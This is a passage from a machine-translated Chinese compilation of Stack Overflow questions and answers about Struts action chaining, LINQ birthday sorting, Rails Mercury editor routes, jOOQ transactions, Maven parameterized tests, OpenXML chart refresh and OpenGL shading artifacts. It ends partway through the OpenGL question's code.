我不认为你可以这样做，没有提到能够使用链结果类型传递额外的参数：http: [//struts.apache.org/release/2.3.x/docs/action-chaining.html](http://struts.apache.org/release/2.3.x/docs/action-chaining.html)

结果是类型链......所以它需要解释和处理你的参数，因为之后一个新的动作开始了。但是链没有这个设施（查看源代码）： http: [//grepcode.com/file/repo1.maven.org/maven2/org.apache.struts.xwork/xwork-core/2.3.1.1/com/ opensymphony/xwork2/ActionChainResult.java](http://grepcode.com/file/repo1.maven.org/maven2/org.apache.struts.xwork/xwork-core/2.3.1.1/com/opensymphony/xwork2/ActionChainResult.java)

如果这是一个正常的重定向，你可以像你一样将这些参数添加到请求中。

换句话说，将所需的属性添加到动作和链将做你需要它，因为链结果没有设施来处理除“命名空间”和“动作”之外的属性。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-02T08:16:11.197

如果您别无选择，只能使用动作链接并且需要将参数从一个传递到另一个，请尝试以下任一方法

1.  在这两个操作中都有相应的 getter/setter 方法。例如：如果您想将“empMode”参数从 Action1 传递到 Action2。在这两个操作中都有 getEmpMode()/setEmpMode() 方法。

2.  将参数添加到要传递给操作上下文中的参数映射的参数。您可以使用 ActionContext.getContext().getParameters() 访问参数映射。将要传递给 Action2 的新参数从 Action1 添加到此映射。如果 Action2 具有新参数的相应 getter/setter，并且假设在堆栈中配置了“params”拦截器，则 Action2 将被正确填充。

# c# - 在 LINQ 中按即将到来的生日排序日期

> ID：15159832
> 
> 赞同：5
> 
> 时间：2013-03-01T14:15:47.003
> 
> 标签：c#, linq

我想在网格中显示即将到来的生日。我有随机顺序的值列表，我想使用 LINQ从今天的日期（假设当前日期是*March 1st ）获取日期的顺序。*

```
List<DateTime> dtlist = new List<DateTime>(); 
```

```
列表 1 值 =“1985 年 7 月 25 日”
列表 2 值 =“1956 年 12 月 31 日”       
列表 3 值 =“1978 年 2 月 21 日”
列表 4 值 =“2005 年 3 月 18 日”

```

输出顺序应为：

```
3月18日
7月25日
12 月 31 日
2月21日

```

注意：我在这里没有使用任何数据库来获取值。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-01T14:37:17.270

请注意，由于（例如）闰日，我们不能将所有日期都投影到当前年份的日期。变成是错误的`February 29th, 2000`。`February 29th, 2013`

让我们首先仅按月份和日期对日期进行排序：

```
var ordered = from dt in dtlist
              orderby dt.Month, dt.Day
              select dt; 
```

现在我们需要找到当前日期之前的所有日期（无论年份）：

```
private static bool IsBeforeNow(DateTime now, DateTime dateTime)
{
    return dateTime.Month < now.Month
        || (dateTime.Month == now.Month && dateTime.Day < now.Day);
} 
```

我最初的建议是跳过/获取我们想要的日期并将它们连接在一起：

```
var now = DateTime.Now;
var afterNow = ordered.SkipWhile(dt => IsBeforeNow(now, dt));
var beforeNow = ordered.TakeWhile(dt => IsBeforeNow(now, dt));

var birthdays = Enumerable.Concat(afterNow, beforeNow); 
```

但是，用户 Rawling 正确地[指出](https://stackoverflow.com/questions/15159832/order-the-dates-by-upcoming-birthdays-in-linq/15160271#comment21348046_15160271)，此代码将对您的日期列表进行*两次*排序：一次`afterNow`是在评估时，一次`beforeNow`是在评估时。他对日期排序的建议`IsBeforeNow`更加优雅，因为它消除了跳过/获取和连接的需要。不再需要前面的代码块，LINQ 查询部分变为：

```
var now = DateTime.Now;
var birthdays = from dt in dtlist
                orderby IsBeforeNow(now, dt), dt.Month, dt.Day
                select dt; 
```

并且`birthdays`是你的结果。这已包含在下面的代码中：

* * *

完整代码：

```
static void Main(string[] args)
{
    var dtlist = new[]{
        DateTime.Parse("25-July-1985"),
        DateTime.Parse("31-Dec-1956"),
        DateTime.Parse("21-Feb-1978"),
        DateTime.Parse("18-Mar-2005")
    };

    var now = DateTime.Now;
    var birthdays = from dt in dtlist
                    orderby IsBeforeNow(now, dt), dt.Month, dt.Day
                    select dt;

    foreach (var dt in birthdays)
    {
        Console.WriteLine(dt.ToString("dd-MMM"));
    }
    Console.ReadLine();
}

private static bool IsBeforeNow(DateTime now, DateTime dateTime)
{
    return dateTime.Month < now.Month
        || (dateTime.Month == now.Month && dateTime.Day < now.Day);
} 
```

印刷：

```
18-地铁
7月25日
12月31日
2月21日

```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-01T15:45:49.740

```
//A mock up value for comparison (as DayOfYear has a leap year issue)
int doy = DateTime.Today.Month*31 + DateTime.Today.Day;

var results = dtlist.OrderBy( a => 
              (a.DateOfBirth.Month * 31 + a.DateOfBirth.Day) +
              (a.DateOfBirth.Month * 31 + a.DateOfBirth.Day > doy ? 0 : 400 ))
             .ToList(); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-01T14:44:02.090

这个自定义比较器委托在[`List.Sort`](http://msdn.microsoft.com/en-us/library/234b841s.aspx)工作：

```
DateTime now = DateTime.Today;
dtlist.Sort((d1, d2) =>
    {
        if (DateTime.IsLeapYear(d1.Year) && d1.Month == 2 && d1.Day == 29)
            d1 = d1.Date.AddMilliseconds(-1);
        if (DateTime.IsLeapYear(d2.Year) && d2.Month == 2 && d2.Day == 29)
            d2 = d2.Date.AddMilliseconds(-1);
        var dtTrunc1 = new DateTime(now.Year, d1.Month, d1.Day, d1.Hour, d1.Minute, d1.Second, d1.Millisecond);
        var dtTrunc2 = new DateTime(now.Year, d2.Month, d2.Day, d2.Hour, d2.Minute, d2.Second, d2.Millisecond);
        TimeSpan diff1 = dtTrunc1 - now;
        TimeSpan diff2 = dtTrunc2 - now;
        if (diff1.Ticks >= 0 && diff2.Ticks >= 0 || diff1.Ticks < 0 && diff2.Ticks < 0)
            return diff1.Ticks.CompareTo(diff2.Ticks);
        else if (diff1.Ticks < 0 && diff2.Ticks >= 0)
            return int.MaxValue;
        else
            return int.MinValue;
    }); 
```

[**1\. Demo**](http://ideone.com/guWCge)（你的样本数据）

[**2\. 演示**](http://ideone.com/iKQc1C)（>1000 个随机日期以证明它正在工作，包括闰年）

这种方法不需要创建新列表，它会对原始列表进行排序。如果`DateTime`变量也包含它，它也会按时间排序。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2020-09-25T13:27:02.917

适用于任何范围和所有情况的解决方案：

```
 static void Main(string[] args)
        {
            List<DateTime> birthdays = new List<DateTime>() {
            new DateTime(1977,1,29),
            new DateTime(1977,1,30),
            new DateTime(1977,1,31)
            };

            var daysFrom = 30;
            var start = new DateTime(DateTime.Now.Year,DateTime.Now.Month,DateTime.Now.Day);
            start = new DateTime(2020, 12, 31); // border test case
            var last = start.AddDays(daysFrom);
            var yearSwitch = last.Year - start.Year;
            var res = birthdays.Where(bday =>
                {
                    var bn = new DateTime(start.Year, bday.Month, bday.Day);
                    if (bday.DayOfYear < daysFrom)
                    {
                        bn = bn.AddYears(yearSwitch);
                    }
                    return bn >= start && bn <= last;
                }
            ).ToList();
            Console.WriteLine("List:{0}", string.Join(",", res));
        } 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-01T15:01:34.783

有趣的问题有多种出错的方法！这是我的尝试：

*   对于每个生日，计算下一个生日**是什么****时候**- 这被定义为今天或之后的第一个生日（通过连续将一年添加到生日获得的天数）
***   **按升序**排列下一个生日*   返回列表**

 **示例代码：

```
var dtlist  = new[]{
    DateTime.Parse("25-July-1985"),
    DateTime.Parse("31-Dec-1956"),
    DateTime.Parse("21-Feb-1978"),
    DateTime.Parse("18-Mar-2005")
};

var today = DateTime.Today;

var nextbirthDays = 
    from birthdate in dtlist
    select 
        Enumerable.Range(0, 1000)
        .Select(birthdate.AddYears)
        .First(birthday => birthday >= today);

var ordered = 
    nextBirthdays
    .OrderBy(d => d)
    .ToList(); 
```

请注意，这将返回`DateTime`即将到来的生日的完整 s，您可以`dd-MMM`根据需要对其进行格式化。另请注意，在 .NET 4.0 之前，您需要

```
.Select(age => birthdate.AddYears(age)) 
```

代替

```
.Select(birthdate.AddYears) 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-03-01T17:18:30.863

其他人说`DayOfYear`有一个`leap year issue`. 实际上我找不到任何问题：2 月 29 日有`DayOfYear == 60`，3 月 1 日有`DayOfYear == 60`非闰年和`DayOfYear == 61`闰年，两者都是正确的。因此，您可以`DayOfYear`用于过滤，但不能将其用于排序，因为这会将 2 月 29 日与 3 月 1 日、3 月 1 日与 3 月 2 日等混淆。但可以按月和日排序：

```
var upcomingBirthdays = birthdays.Where(dt => dt.DayOfYear >= DateTime.Today.DayOfYear).OrderBy(dt => dt.Month).ThenBy(dt => dt.Day); 
```

或者

```
var upcomingBirthdays = from birthday in birthdays
                        where birthday.DayOfYear >= DateTime.Today.DayOfYear
                        orderby birthday.Month, birthday.Day
                        select birthday; 
```

如果某人的生日是 2 月 29 日，它将在非闰年的 3 月 1 日出现，而在闰年的这一天将出现。这就是我在生日日历中所期望的。

**更新：**

我的实现仍然存在一个问题：它不会显示明年即将到来的生日。

由于丢失的生日恰好是原始列表的其余部分，因此您可以对它们执行相同的操作，然后连接结果：

```
var thisYear = from birthday in birthdays
               where birthday.DayOfYear >= DateTime.Today.DayOfYear
               orderby birthday.Month, birthday.Day
               select birthday;

var nextYear = from birthday in birthdays
               where birthday.DayOfYear < DateTime.Today.DayOfYear
               orderby birthday.Month, birthday.Day
               select birthday;

var upcomingBirthdays = thisYear.Concat(nextYear); 
```

这样，结果总是按即将到来的生日的顺序包含原始列表的所有条目。

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2013-03-01T14:22:11.183

```
var currentYear = DateTime.Today.Year;
var birthDays = dtList.Select(d => Tuple.Create(d, new DateTime(currentYear, d.Month, d.Day)))
    .OrderBy(tuple => tuple.Item2)
    .Where(tuple => tuple.Item2 > DateTime.Today)
    .Select(tuple => tuple.Item1)
    .ToList(); 
```

* * *

## 回答 #8

> 赞同：-1
> 
> 时间：2013-03-01T14:34:58.533

我不认为你可以用你收集的日期来做到这一点。诀窍是生日都是过去的特定日期，但您希望能够计算出该日期将在来年再次出现。这意味着您需要首先将每个生日（例如**1985 年**7 月 25 日）转换为该月/日组合的下一次出现（例如**2013 年**7 月 25 日）。只有这样，其他答案中提到的 OrderBy 才会起作用。

```
public IEnumerable<DateTime> UpcomingBirthdays(IEnumerable<DateTime> birthDates)
{
    return birthDates.Select(
        bd => new DateTime( 
            ((bd.Month >= DateTime.Today.Month || (bd.Month == DateTime.Today.Month && bd.Day >= DateTime.Today.Day)) ? DateTime.Today.Year : DateTime.Today.Year + 1),
            bd.Month,
            bd.Day)
        ).OrderBy(bd => bd);
} 
```

此方法确定下一个生日的时间，然后*对这些*日期进行排序。**

# jquery - 使用水银编辑器 + rails 3 的路线范围

> ID：15159833
> 
> 赞同：2
> 
> 时间：2013-03-01T14:15:47.700
> 
> 标签：jquery, ruby-on-rails, ruby-on-rails-3, mercury-editor

我正在检查小项目的水银编辑器[https://github.com/jejacks0n/mercury](https://github.com/jejacks0n/mercury)。

这些是我的 routes.rb 文件

```
Myapp::Application.routes.draw do
  mount Mercury::Engine => '/'
  scope '(:locale)' do
    resources :post
  end
end 
```

我的帖子网址是：

```
http://localhost:3000/es/posts/1
http://localhost:3000/en/posts/2
http://localhost:3000/de/posts/3
.
.
. 
```

我的水星路线：

```
Routes for Mercury::Engine:
mercury_editor  /editor(/*requested_uri)(.:format)        mercury#edit
                /mercury/:type/:resource(.:format)        mercury#resource
                /mercury/snippets/:name/options(.:format) mercury#snippet_options
                /mercury/snippets/:name/preview(.:format) mercury#snippet_preview 
```

我正在尝试类似的东西：

```
<%= link_to 'Edit', "/editor" + request.path %> 
```

但我得到一个错误的网址`http://localhost:3000/editor/es/posts/2`。

**有人可以说我如何为我的路线添加指定路径，例如：**

`http://localhost:3000/es/editor/posts/1`或者`http://localhost:3000/editor/posts/1`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-05T06:21:40.237

替换`<%= link_to 'Edit', "/editor" + request.path %>`为

```
<%= link_to 'Edit', request.path.gsub(/^\/((\w)+)/, '/\1/editor') %> 
```

要得到`http://localhost:3000/es/editor/posts/1`

或者

替换`<%= link_to 'Edit', "/editor" + request.path %>`为

```
<%= link_to 'Edit', request.path.gsub(/^\/((\w)+)/, '/editor') %> 
```

要得到`http://localhost:3000/editor/posts/1`

即使您可以定义一个辅助方法，例如

```
def mercuryfied_url(with_locale = true)
  if with_locale 
    request.path.gsub(/^\/((\w)+)/, '/\1/editor')
  else
    request.path.gsub(/^\/((\w)+)/, '/editor')
  end
end 
```

然后打电话

```
<%= link_to 'Edit', mercuryfied_url %> 
```

要得到`http://localhost:3000/es/editor/posts/1`

或者

```
 <%= link_to 'Edit', mercuryfied_url(false) %> 
```

要得到`http://localhost:3000/editor/posts/1`

希望有帮助:)

# php - Python 获取索引位置的速度比 PHP 慢

> ID：15159836
> 
> 赞同：4
> 
> 时间：2013-03-01T14:16:07.517
> 
> 标签：php, python, performance, python-2.7

我惊讶地发现 Python 在获取索引位置方面比 PHP 慢。有没有办法提高 Python 的性能？

例如：

在 PHP 中花费：18.169965982437

```
<?php
$time_start = microtime(true);
$needle = file_get_contents("needle.wav", false, null, 46);

foreach(range(0, 10000) as $num) {
   $haystack = file_get_contents("haystack.wav");
   $match = strpos($haystack,$needle);
}

$time_end = microtime(true);

$finishTime = $time_end - $time_start;
echo $finishTime;
?> 
```

在 Python 中需要：23.6319999695

```
import time
import math
def microtime(get_as_float = False) :
    if get_as_float:
        return time.time()
    else:
        return '%f %d' % math.modf(time.time())

time_start = microtime(True)
needle = open("needle.wav","rb").read()

for x in range(0, 10000):
    haystack = open("haystack.wav","rb").read()
    match = haystack.index(needle[46:])

time_end = microtime(True)
finishTime = time_end - time_start
print finishTime 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T14:21:15.207

等效的python代码是这样的：

```
needle = open("needle.wav", "rb").read()[46:]

for x in range(0, 10000):
    haystack = open("haystack.wav", "rb").read()
    match = haystack.index(needle) 
```

# java - 如何使用 JOOQ 启动事务和回滚？

> ID：15159842
> 
> 赞同：11
> 
> 时间：2013-03-01T14:16:32.010
> 
> 标签：java, sql, transactions, jooq

是的！我已经阅读了关于

> *   jOOQ 永远不会在连接上提交或回滚（CSV 导入除外，如果在导入 API 中明确配置）
> *   jOOQ 永远不会启动任何事务。
> *   ...

但是当我需要一些事务管理时，这样做的最佳实践是什么？

我有没有说过我是 JOOQ 的一种方式的忠实粉丝！

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-03-02T09:29:07.867

*这个问题是在 jOOQ 还没有实现事务 API 的时候提出的。从 jOOQ 3.4 开始，这样的 API 可用并记录在这里：*

[https://www.jooq.org/doc/latest/manual/sql-execution/transaction-management](https://www.jooq.org/doc/latest/manual/sql-execution/transaction-management)

### 事务 API 及其与 JDBC 的默认绑定

默认情况下，jOOQ 通过一个简单的函数式 API 直接将其（嵌套）事务支持绑定到 JDBC API：

```
DSL.using(configuration)
   .transaction(c -> {
        c.dsl().insertInto(...).execute();
        c.dsl().update(...).execute();
   }); 
```

... lambda 表达式（或更具体地说，[`TransactionalRunnable`](https://www.jooq.org/javadoc/latest/org/jooq/TransactionalRunnable.html)）在其开始时创建一个新事务并在正常完成时提交它，或者在异常时回滚它。

这样的事务可以嵌套

```
DSL.using(configuration)
   .transaction(c1 -> {
        c1.dsl().insertInto(...).execute();
        c1.dsl().transaction(c2 -> {
            c2.dsl().insertInto(...).execute();
        });
        c1.dsl().update(...).execute();
   }); 
```

...如果[`Savepoint`](https://docs.oracle.com/javase/9/docs/api/java/sql/Savepoint.html)将在嵌套事务开始时创建 a 并且嵌套事务在正常完成时丢弃保存点，或者在异常时回滚到它。

### 覆盖默认的 JDBC 绑定

在许多应用程序中，您已经拥有一个预先存在的事务管理系统，例如 JTA 或 Spring TX 或其他东西。在这种情况下，您可以：

*   根本不使用 jOOQ 事务 API
*   实现您自己的实现、 和操作[`TransactionProvider`](https://www.jooq.org/javadoc/latest/org/jooq/TransactionProvider.html)的语义`begin()`，例如通过将它们绑定到 Spring。`commit()``rollback()`

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-03-02T09:36:03.590

事务控制独立于 JOOQ 提供的数据库访问层。

开始和结束事务可能最好在应用程序的[服务层](http://martinfowler.com/eaaCatalog/serviceLayer.html)中处理。请参阅该页面上的图表，该图表显示了服务层与其调用的较低层的关系。

另请参阅[Unit of Work](http://martinfowler.com/eaaCatalog/unitOfWork.html)或[Transaction Script](http://martinfowler.com/eaaCatalog/transactionScript.html)等模式。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-06-24T07:24:14.270

我可以从这个链接中找到一个简单的方法：http: [//blog.liftoffllc.in/2014/06/jooq-and-transactions.html](http://blog.liftoffllc.in/2014/06/jooq-and-transactions.html)。

这个答案可能会给你更详细的解释：[https ://stackoverflow.com/a/24380508/542108](https://stackoverflow.com/a/24380508/542108)

# java - `mvn test` 参数化的 JUnit 测试是否正确？

> ID：15159847
> 
> 赞同：4
> 
> 时间：2013-03-01T14:16:54.277
> 
> 标签：java, maven, junit

我刚刚`JUnit`按照示例使用 4.11 实现了一个 JUnit 测试用例：

[https://github.com/junit-team/junit/blob/master/doc/ReleaseNotes4.11.md#example-1](https://github.com/junit-team/junit/blob/master/doc/ReleaseNotes4.11.md#example-1)

我使用创建一个 Maven 项目

```
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">

    <modelVersion>4.0.0</modelVersion>
    <groupId>com.yyt</groupId>
    <artifactId>example</artifactId>
    <version>0.0.1-SNAPSHOT</version>

    <dependencies>
        <dependency>
            <groupId>junit</groupId>
            <artifactId>junit</artifactId>
            <version>4.11</version>
            <scope>test</scope>
        </dependency>         
    </dependencies>

</project> 
```

而这个测试用例：

```
import java.util.Arrays;

import org.junit.Assert;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.junit.runners.Parameterized;
import org.junit.runners.Parameterized.Parameters;

@RunWith(Parameterized.class)
public class Example {

    @Parameters(name = "{index}: fib({0})={1}")
      public static Iterable<Object[]> data() {
        return Arrays.asList(new Object[][] { { 0, 0 }, { 1, 1 }, { 2, 1 },
          { 3, 2 }, { 4, 3 }, { 5, 5 }, { 6, 8 } });
      }

    private int input;
    private int expected;

    public Example(int input, int expected) {
      this.input = input;
      this.expected = expected;
    }

    @Test
      public void test() {
      }
} 
```

但是当我使用 测试它时`mvn test`，maven 说：

```
-------------------------------------------------------
 T E S T S
-------------------------------------------------------
There are no tests to run. 
```

如何让它发挥作用？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-03-01T15:16:34.740

问题是基于[maven-surefire-plugin](http://maven.apache.org/surefire/maven-surefire-plugin/)的 maven 的命名约定， 它需要像***Test.java****、**Test*** **.java**或**TestCase*.java**这样的命名来进行单元测试。对于集成测试，[maven-failsafe-plugin](http://maven.apache.org/surefire/maven-failsafe-plugin/)负责它具有命名约定**IT*.java**、***IT.java**或***ITCase.java**。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-08-26T18:37:56.650

**@khmarbaise**在这种情况下成功了，但是......

有时你来这里冒险是因为

*   Maven 和 Eclipse 都告诉你你的班级没有测试
*   你*清楚地*知道；并且名副其实
*   这两个工具似乎都找到了**正确的类**并尝试在那里执行测试
*   你开始怀疑 Maven 和 Parameterized 是否一起工作，这个问题的标题听起来很有希望

如果满足上面列出的相关条件，您的 Maven 输出应该按照以下方式说明：

```
-------------------------------------------------------
 T E S T S
-------------------------------------------------------
Running your.maven.properly.named.SomeTest
Tests run: 0, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 7.684 sec

Results :

Tests run: 0, Failures: 0, Errors: 0, Skipped: 0

[INFO] ------------------------------------------------------------------------
[ERROR] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] No tests were executed!  (Set -DfailIfNoTests=false to ignore this error.) 
```

如果是这样，我的建议是：尝试查看用于获取数据的任何内容是否**实际返回任何内容**。换句话说：看看用`@Parameters`. 如果没有数据，您的测试将无法运行。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-09-27T16:00:02.207

陷入同样的​​问题。[在 junit https://github.com/junit-team/junit4/issues/664](https://github.com/junit-team/junit4/issues/664)中发现了这个（仍然）未解决的问题。所以，现在没有办法让它工作。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-06-10T13:01:33.270

我知道的唯一解决方案 - 是运行整个课程，而不是课堂测试。

前有效：

```
mvn clean -Dtest=ExampleClassTest test 
```

前不起作用：

```
mvn clean -Dtest=ExampleClassTest#test test 
```

但要小心，类中的所有测试都将使用参数运行！

# openxml-sdk - 更新 open xml sdk 2.0 中的嵌入式 excel 部分后图表不刷新

> ID：15159851
> 
> 赞同：1
> 
> 时间：2013-03-01T14:17:03.140
> 
> 标签：openxml-sdk

我正在尝试通过其他一些 excel 文件更新 power point 中图表的嵌入式 excel 部分，它正在更新嵌入式 excel 文件但图表。

我注意到的一件事是，一旦我从“编辑数据”选项返回，我就可以在图表中看到更新。请帮助我如何在打开的 xml 中刷新图表

我正在使用以下代码，

```
 PresentationDocument myDestDeck = PresentationDocument.Open(@"Presentation1.pptx", true);

        PresentationPart PresPart = myDestDeck.PresentationPart;
        SlidePart slidePart = PresPart.SlideParts.FirstOrDefault();
        ChartPart chartPart1 = slidePart.ChartParts.FirstOrDefault();

        EmbeddedPackagePart embeddedPackagePart1 = chartPart1.EmbeddedPackagePart;
        embeddedPackagePart1.FeedData(new FileStream(@"Output12.xlsx", FileMode.Open, FileAccess.ReadWrite));

        PresPart.Presentation.Save();
        myDestDeck.Close(); 
```

请帮忙

提前致谢，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T12:55:28.173

我只在 .docx 上下文中使用过 Open XML，但我怀疑您在想更新文档中的一些嵌入字符时遇到了同样的问题。

假设我采用的相同方法对 Power Point 有效，则图表在包含所有文件的 zip 包中具有两个数据点。首先，您有 excel 文件中的数据条目（在 word 文档中将位于 /word/embeddings 中）此外，您还有一个数据缓存，其中包含（出于某种原因）文件中显示的数据缓存xml 格式。（位于 /word/charts 中）为了让您的新数据在文件打开时立即生效，您还需要更新这些文件。

我首先抓住图表部分解决了这个问题

```
using (WordprocessingDocument wordDoc = WordprocessingDocument.Open(name, true))
            {
                var mainPart = wordDoc.MainDocumentPart; //indlæs hovedpart af dokumentet
                DocumentFormat.OpenXml.Packaging.ChartPart[] charts = mainPart.ChartParts.ToArray(); //hent grafer
            } 
```

您需要在要编辑的图表上挖掘 DocumentFormat.OpenXml.Drawing 然后隔离 DocumentFormat.OpenXml.Drawing.Charts.ChartReference 从那里您可以获得图表 ID，您可以在 Rels 文件中查找到获取您需要编辑的图表 xml 的路径。

我没有在项目中编写那部分代码，但我可以自由分享这些混乱，所以你去吧。这是从 BookmarkStart 挖掘到 ChartReference 的一种丑陋方式。

[注：RelsRID 是一个以 ID 为键，文件名为值的字典。]

```
private String grab(BookmarkStart bookmarkStart)
    {
        //isolate chart
        #region grab
        var rids = RelsRID;
        DocumentFormat.OpenXml.Wordprocessing.Drawing elem = null;
        DocumentFormat.OpenXml.Drawing.Charts.ChartReference gd = null;
        try
        {
            elem = bookmarkStart.NextSibling().Elements<Drawing>().ElementAt(0); //første forsøg på at finde vores graf
        }
        catch (Exception)
        { //forsøg nummer 2
            OpenXmlElement testE = bookmarkStart.NextSibling();
            while (testE.LocalName.ToLower() != "drawing")
            {
                testE = testE.NextSibling();
                for (int i = 0; i < testE.Elements().Count(); i++)
                    if (testE.ElementAt(i).LocalName.ToLower() == "drawing") testE = testE.ElementAt(i);
            }
            elem = (DocumentFormat.OpenXml.Wordprocessing.Drawing)testE;
        }
        try
        { //first try at grabbing graph data
            gd = (DocumentFormat.OpenXml.Drawing.Charts.ChartReference)elem.Inline.Graphic.GraphicData.ElementAt(0);
        }
        catch (Exception)
        { //second possible route
            gd = (DocumentFormat.OpenXml.Drawing.Charts.ChartReference)elem.Anchor.Elements<Graphic>().First().Elements<GraphicData>().First().ElementAt(0);
        }
        var id = gd.Id;
        String matchname = "/word/" + rids[id.ToString()]; //create filepath
        #endregion
        return matchname;
    } 
```

如何处理获取图表 xml 的文件路径取决于您。我真的不赞成这种方式，但它应该让你知道如何处理它。

当你把路径整理好后，你可以做这样的事情（使用我们在第一个代码段中提取的图表

```
public void EditGraph(BookmarkStart bookmarkStart, DocumentFormat.OpenXml.Packaging.ChartPart[] charts)
    {
        String check = grab(bookmarkStart);
        ChartPart chart = null;

        for (int i = 0; i < charts.Count(); i++) //loop th
        {
            chart = charts[i];
            if (check.ToLower().Equals(chart.Uri.ToString().ToLower()))
                break;
        }
        //chart now contains the chart-cache you are looking to edit.
    } 
```

您现在可以选择编辑其中包含的数据的方式。我选择从图表中拉出绘图 xml，将其从图表中删除，编辑我拉出的 xml 并将其放回。但我确信您也可以直接使用 open-xml 来完成。你得到这样的情节元素

```
var plots = chart.ChartSpace.Elements<DocumentFormat.OpenXml.Drawing.Charts.Chart>(); 
```

我希望我知道一种更简单的方法来解释它，但这是我能做的最好的事情。

最后，我从来没有真正找到从文档中提取 Rels 的好方法，所以我最终只是跳入 zip 文件并将其拉出。

我像这样构建以前使用的 rels-dictionary

```
private Dictionary<String, String> RelsRIDToFile()
    {
    String rels;
            using (MemoryStream memory = new MemoryStream())
            {
                using (ZipFile zip = ZipFile.Read("wordfile.docx"))
                {
                    ZipEntry e = zip["word/_rels/document.xml.rels"];
                    e.Extract(memory);
                }
                using (StreamReader reader = new StreamReader(memory))
                {
                    memory.Seek(0, SeekOrigin.Begin);
                    rels = reader.ReadToEnd();
                }
            }
        XmlDataDocument xml = new XmlDataDocument();
        xml.LoadXml(rels);
        XmlNodeList xmlnode;
        xmlnode = xml.GetElementsByTagName("Relationship");
        Dictionary<String, String> result = new Dictionary<string, string>();
        for (int i = 0; i < xmlnode.Count; i++)
        {
            var node = xmlnode[i];
            var atts = node.Attributes;
            String id = "";
            String target = "";
            for (int ii = 0; ii < atts.Count; ii++)
            {
                var att = atts[ii];
                if (att.Name.ToLower() == "id") id = att.Value;
                if (att.Name.ToLower() == "target") target = att.Value;
            }
            result[id] = target;
        }
        return result;
    } 
```

祝你好运，如果我能澄清一些事情，请告诉我。

# opengl - 从角度观察时，Opengl剥离表面

> ID：15159853
> 
> 赞同：0
> 
> 时间：2013-03-01T14:17:06.820
> 
> 标签：opengl

我的程序中有剥离表面的问题。

我使用 OpenGL(Tao) 渲染了一些表面。我使用triangle_strip。为了获得良好的 3D 印象，我使用照明。法线设置正确。

起初我使用crossProduct，现在我使用隐式函数的推导。两种方法似乎都给出了正确的结果，由于精度，推导可能更好。我在表面上看到垂直条纹。带中的两个相邻三角形具有不同的色调/阴影。1,3,5,7 ... 和 2,4,6... 具有相同的色调/阴影。视角越小，差异越大。90°就可以了。

我怎样才能摆脱条纹？

在这里你可以看到图片： ![在此处输入图像描述](../Images/6b19564901119bfc126e377fb9a02aa0.png) ![在此处输入图像描述](../Images/3d98f535fe448c38f9c3bc97077a73b1.png) ![在此处输入图像描述](../Images/d8cd4909a425fef767214e053b054b75.png) ![在此处输入图像描述](../Images/d59494ccaed5b3a5ac7ece309d337c71.png) ![在此处输入图像描述](../Images/86bf73cfbd3e26297df0dfd5205cd271.png) ![在此处输入图像描述](../Images/5dc6580be1b25c413f47faeb71c64cf1.png)

初始化：

```
private float[] materialAmbient = { 1.0f, 1.0f, 1.0f, 1.0f };
private float[] materialDifuse = { 0.6f, 0.6f, 0.6f, 1.0f };
private float[] materialOdlesky = { 0.2f, 0.2f, 0.2f, 1.0f };
private float[] materialShininess = { 50.0f };
private float[] light_position = { 0.0f, 0.0f, 1.0f, 1.0f};
private float[] light_color = { 0.7f, 0.7f, 0.7f }

Gl.glShadeModel(Gl.GL_SMOOTH);
Gl.glEnable(Gl.GL_DEPTH_TEST);
Gl.glHint(Gl.GL_LINE_SMOOTH_HINT, Gl.GL_NICEST);
Gl.glDepthFunc(Gl.GL_LESS);
Gl.glEnable(Gl.GL_COLOR_MATERIAL);

Gl.glMaterialfv(Gl.GL_FRONT_AND_BACK, Gl.GL_AMBIENT, materialAmbient);
Gl.glMaterialfv(Gl.GL_FRONT_AND_BACK, Gl.GL_DIFFUSE, materialDifuse);  
Gl.glMaterialfv(Gl.GL_FRONT_AND_BACK, Gl.GL_SPECULAR, materialOdlesky); 
Gl.glMaterialfv(Gl.GL_FRONT_AND_BACK, Gl.GL_SHININESS, materialShininess);
Gl.glLightfv(Gl.GL_LIGHT0, Gl.GL_POSITION, light_position);
Gl.glLightfv(Gl.GL_LIGHT0, Gl.GL_DIFFUSE, light_color); 
Gl.glLightModeli(Gl.GL_LIGHT_MODEL_TWO_SIDE, Gl.GL_TRUE);  
Gl.glEnable(Gl.GL_LIGHTING);
Gl.glEnable(Gl.GL_LIGHT0); 
```

绘图代码：

```
double foo = 15;
        for (double v = -foo; v < foo; v += vStep)
        {
            if (v > foo - vStep)
                v = foo - vStep;
            Gl.glBegin(Gl.GL_TRIANGLE_STRIP);
            Gl.glColor3dv(_color);
            for (double u = -foo; u < foo + uStep; u += uStep)
            {
                if (u > foo)
                    u = foo;
                SetVextexAndHisNormal(u, v);
                SetVextexAndHisNormal(u, v + vStep);
                if (u == foo)
                    break;
            }
            Gl.glEnd();
            if (v == foo - vStep)
                break;
        }

 public void SetVextexAndHisNormal(double u, double v)
    {
        Vector v1 = ComputeCoordinatesAt(u, v);
        double x = (-2 / (_a + _a)) * v1.GetX();
        double y = (2 / (_b + _b)) * v1.GetY();
        double z = -2*_k;
        Vector normal = new Vector(x, y, z);
        normal.NornVector();

